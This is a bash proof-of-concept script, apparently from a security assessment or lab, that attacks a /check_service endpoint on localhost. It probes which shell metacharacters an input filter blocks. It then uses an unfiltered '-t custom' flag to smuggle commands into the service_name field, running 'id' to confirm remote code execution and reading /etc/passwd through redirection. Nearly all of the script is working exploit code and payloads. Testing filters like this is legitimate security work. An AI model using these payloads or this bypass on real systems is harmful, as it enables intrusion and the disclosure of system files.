#!/bin/bash

# POC: Incomplete Input Validation Filter Analysis
# This script tests the /check_service endpoint to demonstrate which shell
# metacharacters are blocked by the filter and which pass through

TARGET="http://localhost:8080/check_service"

echo "=========================================="
echo "Input Validation Filter Bypass Test"
echo "=========================================="
echo ""

# Test cases with various shell metacharacters
declare -a TESTS=(
    # Format: "payload|description"
    "test&echo|Ampersand (&) - AND operator"
    "test|echo|Pipe (|) - Piping operator"
    "test\$VAR|Dollar sign (\$) - Variable expansion"
    "test;echo|Semicolon (;) - Command separator"
    "test\`whoami\`|Backtick (\`) - Command substitution"
    "-tcustom|Dash (-) - Flag prefix (NOT FILTERED)"
    "test<file|Less than (<) - Input redirection (NOT FILTERED)"
    "test>file|Greater than (>) - Output redirection (NOT FILTERED)"
    "test>>file|Append (>>) - Output append (NOT FILTERED)"
    "test()|Parentheses () - Subshell (NOT FILTERED)"
    "test{}|Curly braces {} - Command grouping (NOT FILTERED)"
    "test*|Asterisk (*) - Glob expansion (NOT FILTERED)"
    "test?file|Question mark (?) - Glob single char (NOT FILTERED)"
    "test[abc]|Brackets [] - Character class (NOT FILTERED)"
    "test!cmd|Exclamation (!) - History expansion (NOT FILTERED)"
    "~test|Tilde (~) - Home directory (NOT FILTERED)"
)

echo "Testing characters that should be blocked by filter:"
echo "---------------------------------------------------"

for test in "${TESTS[@]}"; do
    IFS='|' read -r payload description <<< "$test"
    
    # Create JSON payload
    json_payload="{\"service_name\": \"$payload\"}"
    
    # Send request and check response
    response=$(curl -s -X POST "$TARGET" \
        -H "Content-Type: application/json" \
        -d "$json_payload")
    
    # Check if response is valid JSON (success) or error
    if echo "$response" | grep -q '"status"'; then
        status="✓ ALLOWED (filter did NOT block it)"
    elif echo "$response" | grep -q "Did not attempt"; then
        status="✗ REJECTED (filter blocked it)"
    elif echo "$response" | grep -q '"service_name"'; then
        status="✓ ALLOWED (filter did NOT block it)"
    else
        status="? UNKNOWN (response: $response)"
    fi
    
    printf "%-30s %s\n" "$description:" "$status"
done

echo ""
echo "=========================================="
echo "Filter Coverage Analysis"
echo "=========================================="
echo ""

# Test the actual filter bypass with -t custom
echo "Testing filter bypass with -t custom flag:"
echo "-------------------------------------------"

payload="-t custom id"
json_payload="{\"service_name\": \"$payload\"}"

response=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "$json_payload")

echo "Payload: $payload"
echo "Response: $response"
echo ""

if echo "$response" | grep -q "uid="; then
    echo "✓ BYPASS SUCCESSFUL - Command executed (RCE confirmed)"
else
    echo "Response received (check if command output is present)"
fi

echo ""
echo "Testing file read via redirection:"
echo "-----------------------------------"

payload="-t custom cat</etc/passwd"
json_payload="{\"service_name\": \"$payload\"}"

response=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "$json_payload")

echo "Payload: $payload"
echo "Response (first 100 chars): ${response:0:100}"
echo ""

if echo "$response" | grep -q "root:"; then
    echo "✓ FILE READ SUCCESSFUL - /etc/passwd contents retrieved"
else
    echo "File read may have succeeded (check response above)"
fi

echo ""
echo "=========================================="
echo "Conclusion"
echo "=========================================="
echo "The filter blocks 7 characters: & | \$ ; \` \\n \\r"
echo "But allows 16+ dangerous shell operators"
echo "This incomplete filter provides false sense of security"
echo "=========================================="